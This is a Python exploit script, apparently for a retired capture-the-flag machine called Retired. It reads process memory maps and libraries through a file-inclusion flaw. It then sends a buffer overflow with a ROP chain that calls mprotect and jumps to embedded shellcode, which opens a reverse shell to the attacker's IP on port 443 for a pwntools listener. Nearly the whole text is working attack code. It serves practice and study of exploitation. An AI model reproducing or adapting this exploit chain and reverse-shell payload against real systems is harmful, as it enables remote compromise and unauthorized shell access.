import requests
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Bof Retired ~ GatoGamer1155\n")
except:
    print('\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n')
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

inip = input("\n[\033[1;34m*\033[1;37m] Introduce tu ip (tun0): ")

def file(path):
    request = requests.get(f"http://10.10.11.154/index.php?page={path}", allow_redirects=False)
    rpath = f"/dev/shm/{path.split('/')[-1]}"
    with open(rpath,"wb") as f:
        f.write(request.content)
    return rpath

def rpid():
    request = requests.get(f"http://10.10.11.154/index.php?page=/proc/sched_debug", allow_redirects=False)
    pid = re.search("activate_licens\s+([0-9]+)",request.text).group(1)
    return pid

def adrs(pid):
    r = requests.get(f"http://10.10.11.154/index.php?page=/proc/{pid}/maps", allow_redirects=False)
    libcb = int(re.search("^.*libc.*$", r.text, re.M).group(0).split("-")[0], 16)
    libcp = re.search("^.*libc.*$", r.text, re.M).group(0).split(" ")[-1]
    libsb = int(re.search("^.*libsqlite.*$", r.text, re.M).group(0).split("-")[0], 16)
    libsp = re.search("^.*libsqlite.*$", r.text, re.M).group(0).split(" ")[-1]
    sbase = int(re.search("^.*\[stack\].*$", r.text, re.M).group(0).split("-")[0], 16)
    ssend = int(re.search("^.*\[stack\].*$", r.text, re.M).group(0).split("-")[1].split()[0], 16)
    return libcb, libcp,libsb, libsp, sbase, ssend

def bof():
    ip = socket.inet_aton(inip)
    payload =  b""
    payload += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
    payload += b"\x97\x48\xb9\x02\x00\x01\xbb"  +   ip  +  b"\x51\x48"
    payload += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
    payload += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
    payload += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
    payload += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

    pid = rpid()

    libcb, libcp, libsb, libsp, sbase, ssend = adrs(pid)

    ssize = ssend - sbase

    context.clear(arch='amd64')
    libc = ELF(file(libcp),checksec=False)
    libc.address = libcb
    libsql = ELF(file(libsp),checksec=False)
    libsql.address = libsb
    rop = ROP([libc, libsql])

    offset = 520

    prt = libc.symbols['mprotect']
    rdi = rop.rdi[0]
    rsi = rop.rsi[0]
    rdx = rop.rdx[0]
    rsp = rop.jmp_rsp[0]

    exploit = b'A' * offset
    exploit += p64(rdi) + p64(sbase)
    exploit += p64(rsi) + p64(ssize)
    exploit += p64(rdx) + p64(7)
    exploit += p64(prt)
    exploit += p64(rsp)
    exploit += payload

    requests.post(f"http://10.10.11.154/activate_license.php", files = { "licensefile": exploit } )

threading.Thread(target=bof, args=()).start()
shell = listen(443, timeout=60).wait_for_connection()
shell.sendline(b"export TERM=xterm HOME=/var/www")
shell.interactive()
